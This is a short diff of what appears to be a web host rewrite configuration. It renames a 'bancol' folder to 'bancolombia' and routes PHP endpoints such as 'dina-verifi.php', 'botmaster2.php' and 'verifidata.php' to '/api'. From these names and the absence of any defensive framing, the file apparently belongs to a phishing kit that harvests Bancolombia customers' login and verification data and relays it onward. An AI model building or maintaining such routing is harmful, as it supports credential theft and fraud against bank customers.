@@ -91,19 +91,19 @@
       "destination": "/api"
     },
     {
-      "source": "/dinadatos/bancol/dina-verifi.php",
+      "source": "/dinadatos/bancolombia/dina-verifi.php",
       "destination": "/api"
     },
     {
-      "source": "/dinadatos/bancol/dinacol.php",
+      "source": "/dinadatos/bancolombia/dinacol.php",
       "destination": "/api"
     },
     {
-      "source": "/dinadatos/bancol/botmaster2.php",
+      "source": "/dinadatos/bancolombia/botmaster2.php",
       "destination": "/api"
     },
     {
-      "source": "/dinadatos/bancol/verifidata.php",
+      "source": "/dinadatos/bancolombia/verifidata.php",
       "destination": "/api"
     }
   ]
